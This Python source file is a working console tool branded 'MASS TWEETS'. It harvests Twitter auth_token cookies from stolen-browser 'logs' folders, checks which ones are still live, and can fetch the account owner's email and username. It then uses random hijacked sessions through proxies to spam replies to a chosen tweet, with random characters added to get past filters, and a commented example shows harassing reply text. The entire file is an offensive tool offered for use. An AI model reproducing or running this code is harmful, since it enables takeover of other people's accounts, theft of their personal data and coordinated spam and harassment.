import requests
import urllib3
import random
from concurrent.futures import ThreadPoolExecutor
import os
import easygui
from concurrent.futures import ThreadPoolExecutor
from conn import conn
import sys
import string
from datetime import datetime
import colorama
colorama.init()
import re
import threading
import ctypes
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
print(colorama.Fore.GREEN+"|CHECKING MODULES|")
os.system("pip install easygui")
os.system("pip install colorama")
os.system("pip install requests")
class TWIITER:
   def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[MASS TWEETS]--VERSION 1.00|BY @BINARY_THUG|VALIDS:{self.valid_auth}|INVALIDS:{self.invalid_auth}|TOTAL LOGS FOLDER:{len(lin)}")
   def __init__(self) -> None:
       self.valid_auth=0
       self.glob_tr=True
       self.invalid_auth=0
   def center(self, var: str, space: int = None):
      if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
            return "\n".join((' ' * int(space)) + var for var in var.splitlines())
   def title(self):
      ctypes.windll.kernel32.SetConsoleTitleW("[MASS TWEETS]--VERSION 1.00|BY @BINARY_THUG|SOON COMING LATEST VERSION")
      TITLE ='''
     ███╗   ███╗ █████╗ ███████╗███████╗    ████████╗██╗    ██╗███████╗███████╗████████╗
     ████╗ ████║██╔══██╗██╔════╝██╔════╝    ╚══██╔══╝██║    ██║██╔════╝██╔════╝╚══██╔══╝
     ██╔████╔██║███████║███████╗███████╗       ██║   ██║ █╗ ██║█████╗  █████╗     ██║   
     ██║╚██╔╝██║██╔══██║╚════██║╚════██║       ██║   ██║███╗██║██╔══╝  ██╔══╝     ██║   
     ██║ ╚═╝ ██║██║  ██║███████║███████║       ██║   ╚███╔███╔╝███████╗███████╗   ██║   
     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚══════╝╚══════╝   ╚═╝  
                               [BY @BINARY_THUG] 
      '''
      print(self.center(colorama.Fore.BLUE+TITLE+colorama.Fore.RESET))

   def Path(self, path):
        paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if dir in {'cookies', 'COOKIES', 'Cookie', 'Cookies', 'COOKIE'}:
                    paths.append(os.path.join(root, dir))
        return set(paths)
   def net_to_cookie(self, filename, service):
        cookies = {}

        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                    except Exception:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                    except Exception:
                        continue

        return cookies
   def extractauthtoken_checktoken(self,path,dt,filename):
      for root,dirs,files in os.walk(path):
         for fil in files:
            if str(fil).endswith(".txt"):
               sun=os.path.join(root,fil)
               teyr=self.net_to_cookie(sun,"twitter")
               if "auth_token" in teyr:
                  TER=self.getct0(teyr['auth_token'],filename)
                  if TER=="INVALIDAUTH":
                     self.invalid_auth=self.invalid_auth+1
                     print(colorama.Fore.RED+"[*] INVALID"+colorama.Fore.RESET+"|"+colorama.Fore.BLUE+f'{teyr['auth_token']}'+colorama.Fore.RESET+"|"+colorama.Fore.RED+"BY @BINARY_THUG")
                  else:
                     self.valid_auth=self.valid_auth+1
                     print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+"|"+colorama.Fore.BLUE+f'{teyr['auth_token']}'+colorama.Fore.RESET+"|"+colorama.Fore.RED+"BY @BINARY_THUG")
                     output=os.path.join(dt,"approvedtoken.txt")
                     with open(output,"a",errors="ignore",encoding="utf-8") as wer:
                        wer.write(teyr['auth_token']+"\n") 
               else:
                  continue
               
         
      
   def getct0(self,authtoken,filename):
        client=requests.Session()
        url_2="https://twitter.com/settings/connected_apps"
        header= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "cookie": f"auth_token={authtoken}",
        }
        
        try:
           conn((client.get),url_2,headers=header,verify=False,filesname=filename)
           ct0=client.cookies.get_dict()['ct0']
           return ct0
        except:
           return "INVALIDAUTH"
   def fetch_userdetail(self,authtoken,ct0):     
        url = "https://twitter.com/i/api/1.1/users/email_phone_info.json"
        headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
        "cookie": f"auth_token={authtoken};; ct0={ct0}",
        "referer": "https://twitter.com/settings/connected_apps",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "sec-gpc": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
        "x-csrf-token": ct0,
        "x-twitter-active-user": "yes",
        "x-twitter-auth-type": "OAuth2Session",
        "x-twitter-client-language": "en",
        }
        data=requests.get(url,headers=headers,verify=False).json()
        email=data['emails'][0]['email']
        urt='https://api.twitter.com/1.1/account/settings.json?include_mention_filter=True&include_nsfw_user_flag=True&include_nsfw_admin_flag=True&include_ranked_timeline=True&include_alt_text_compose=True&ext=ssoConnections&include_country_code=True&include_ext_dm_nsfw_media_filter=True&include_ext_sharing_audiospaces_listening_data_with_followers=True'
        headersi = {
        'Host': 'api.twitter.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Referer': 'https://twitter.com/',
        'x-twitter-auth-type': 'OAuth2Session',
        'x-csrf-token': ct0,
        'x-twitter-client-language': 'en',
        'x-twitter-active-user': 'yes',
        'x-client-transaction-id': '5YB6E1jchZ4H+Lfp/9Sf1/nBRPbQNENazZPhys5eJgmUkHCBLZ/KMXL53TMSHbSy+qyA8+QUmv4kj3UU/0ieg7Sk9gK+5A',
        'Origin': 'https://twitter.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
        'Connection': 'keep-alive',
        'Cookie': f"auth_token={authtoken};; ct0={ct0}",
        'Accept-Encoding': 'gzip, deflate'
        }
        user=requests.get(urt,headers=headersi,verify=False).json()
        username=user["screen_name"]
        return username,email
   def load_self(self,file):
      with open(file,'r',errors='ignore',encoding="utf-8") as load:
         return random.choice(load.readlines())
         
      
   def tweetr(self,authfile,tweete,tweetid,filename,r):
      for i in range(0,r):
         tweetei=random.choice(tweete)+"  "+(random.choice(str(string.ascii_letters+string.punctuation+string.digits))) +str(random.choice(str(string.ascii_letters+string.punctuation+string.digits)))
         auth=str(self.load_self(authfile))
         ct0=self.getct0(auth.replace("\n",""),filename)
         t=self.make_tweet(auth.replace("\n",""),ct0=ct0,twwet_id=tweetid,tweete=tweetei,filename=filename)
         if t=="MODIJI":
            print(colorama.Fore.RED+"[*] BANNED OR ETC"+colorama.Fore.RESET+"|"+colorama.Fore.BLUE+auth+colorama.Fore.RESET+"|"+colorama.Fore.RED+"BY @BINARY_THUG")
         elif t=="HANIME":
            print(colorama.Fore.GREEN+"[*] TWEETED OR ETC"+colorama.Fore.RESET+"|"+colorama.Fore.BLUE+auth+colorama.Fore.RESET+"|"+colorama.Fore.RED+"BY @BINARY_THUG")
         else:
            print(colorama.Fore.RED+"[*] BANNED OR ETC"+colorama.Fore.RESET+"|"+colorama.Fore.BLUE+auth+colorama.Fore.RESET+"|"+colorama.Fore.RED+"BY @BINARY_THUG")
   def tweetr_runner(self,authfile,tweete,tweetid,filename,r):
      with ThreadPoolExecutor(max_workers=15) as ex:
         try:
            ex.submit(self.tweetr,authfile,tweete,tweetid,filename,r)
         except:
            return None

         
        
   def make_tweet(self,authtoken,ct0,tweete,twwet_id,filename):
              
        headersy = {
        'Host': 'twitter.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/json',
        'Referer': 'https://twitter.com/compose/tweet',
        'X-Client-UUID': '1478ee59-c51b-454b-baf5-7f67dc54a369',
        'x-twitter-auth-type': 'OAuth2Session',
        'x-csrf-token': ct0,
        'x-twitter-client-language': 'en',
        'x-twitter-active-user': 'yes',
        'x-client-transaction-id': 'mjLAwXDVhHMo/mtSM+Bd9z4G3aFfEFoHbOOI0rIw/V5yVE1rgQNkrotHjbSz8CC5X+KGgpuZaUWryY1AQIaGDI+b4/fZmw',
        'Origin': 'https://twitter.com',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
        'Connection': 'close',
        'Cookie': f"auth_token={authtoken};; ct0={ct0}",
        'Accept-Encoding': 'gzip, deflate'
         }
        uril="https://twitter.com/i/api/graphql/5V_dkq1jfalfiFOEZ4g47A/CreateTweet"
        json={
   "features" : {
      "c9s_tweet_anatomy_moderator_badge_enabled" : True,
      "freedom_of_speech_not_reach_fetch_enabled" : True,
      "graphql_is_translatable_rweb_tweet_is_translatable_enabled" : True,
      "longform_notetweets_consumption_enabled" : True,
      "longform_notetweets_inline_media_enabled" : True,
      "longform_notetweets_rich_text_read_enabled" : True,
      "responsive_web_edit_tweet_api_enabled" : True,
      "responsive_web_enhance_cards_enabled" : False,
      "responsive_web_graphql_exclude_directive_enabled" : True,
      "responsive_web_graphql_skip_user_profile_image_extensions_enabled" : False,
      "responsive_web_graphql_timeline_navigation_enabled" : True,
      "responsive_web_home_pinned_timelines_enabled" : True,
      "responsive_web_media_download_video_enabled" : False,
      "responsive_web_twitter_article_tweet_consumption_enabled" : False,
      "standardized_nudges_misinfo" : True,
      "tweet_awards_web_tipping_enabled" : False,
      "tweet_with_visibility_results_prefer_gql_limited_actions_policy_enabled" : True,
      "tweetypie_unmention_optimization_enabled" : True,
      "verified_phone_label_enabled" : False,
      "view_counts_everywhere_api_enabled" : True
   },
   "queryId" : "5V_dkq1jfalfiFOEZ4g47B",
   "variables" : {
      "dark_request" : False,
      "media" : {
         "media_entities" : [],
         "possibly_sensitive" : False
      },
      "reply" : {
         "exclude_reply_user_ids" : [],
         "in_reply_to_tweet_id" : f"{twwet_id}"
      },
      "semantic_annotation_ids" : [],
      "tweet_text" : f"{tweete}"
   }
}
        try:
           Tweet_st=conn((requests.post),uril,headers=headersy,json=json,verify=False,filesname=filename)
        except Exception as e:
           return None
        if Tweet_st is None:
           return None
        if '{"errors"' in Tweet_st.text:
           return "MODIJI"
        elif '{"data"' in Tweet_st.text:
           return "HANIME"
        else:
           return "PINKY"
   def runner(self,logs_path,datetime,filename):
        print(colorama.Fore.CYAN+"LOADING MODULE")
        path_list=self.Path(path=logs_path)
        with ThreadPoolExecutor(max_workers=26) as executor:
            for pat in path_list:
                try:
                    executor.submit(self.extractauthtoken_checktoken,pat,datetime,filename)
                except:
                    continue 
            t=threading.Thread(target=self.print_stats,args=(path_list,))
            t.daemon=True
            t.start()
            os.system("cls")
            self.title()
            executor.shutdown(wait=True)
            self.glob_tr=False
#T=TWIITER()
#.tweetr("y.txt",["DELUSIONAL","JJK COMMUNITY ON BREAKS","U GUYZ NEED THERAPY",],'1739351280760299944',filename="r.txt",21)
def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia
def tweetloadi(txtfiles):
   tweetloads=[]
   with open(txtfiles,'r',errors='ignore',encoding="utf-8") as bund:
      for lie in bund.readlines():
         tweetloads.append(lie.replace("\n",""))
   return tweetloads
         
      
def main():
   os.system("cls")
   colorama.init()
   d=TWIITER()
   d.title()
   print(f'''       [{colorama.Fore.BLUE}*{colorama.Fore.RESET}]MAIN MENU
         
[{colorama.Fore.BLUE}1{colorama.Fore.RESET}] MASS TWEET    [{colorama.Fore.GREEN}2{colorama.Fore.RESET}]EXTRACT AUTH TOKEN FROM LOGS AND CHECKS THEM [NEEDS HQ LOGS WONT WORK OTHEWISE] 
[{colorama.Fore.YELLOW}3{colorama.Fore.RESET}] EXITS                                                           
             ''')
   choices=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
   if choices=='1':
      os.system("cls")
      loc_auth=easygui.fileopenbox(title="SELECT TWITTER AUTH TOKEN FILE [.TXT ONLY]",filetypes=["*.txt"],multiple=False)
      loc_prox=easygui.fileopenbox(title="SELECT TWITTER PROXY FILE [HTTP/HTTPS ONLY]",filetypes=["*.txt"],multiple=False)
      loc_tweets=easygui.fileopenbox(title="SELECT TWEETS FILE ",filetypes=["*.txt"],multiple=False)
      twarts=tweetloadi(loc_tweets)
      id=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER TWEET ID CHOICE:")
      ran=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER NO OF  TWEETS U WANT TO SPAM:")
      os.system("cls")
      d.title()
      d.tweetr_runner(loc_auth,twarts,id,loc_prox,int(ran))
      os.system("cls")
      d.title()
      print(f"""
    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] BACK TO MAIN MENU

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
      t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
      
      if t=="1":
         os.system("cls")
         main()
      elif t==2:
         os.system("cls")
         sys.exit()
      else:
         os.system("cls")
         sys.exit()
   elif choices=="2":
      os.system("cls")
      loc_path=easygui.diropenbox(title="SELECT LOGS FOLDER ")
      current = os.path.join(os.getcwd(), "Result")
      s = datetimefolder(current)
      loc_prox=easygui.fileopenbox(title="SELECT TWITTER PROXY FILE [HTTP/HTTPS ONLY]",filetypes=["*.txt"],multiple=False)
      d.runner(loc_path,s,filename=loc_prox)
      os.system("cls")
      d.title()
      ctypes.windll.kernel32.SetConsoleTitleW(f"[MASS TWEETS]--VERSION 1.00|BY @BINARY_THUG|VALIDS:{d.valid_auth}|INVALIDS:{d.invalid_auth}|")
      print(f"""
    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] BACK TO MAIN MENU

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
      t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
      
      if t=="1":
         os.system("cls")
         main()
      elif t==2:
         os.system("cls")
         sys.exit()
      else:
         os.system("cls")
         sys.exit()
      
   else:
      sys.exit()


main()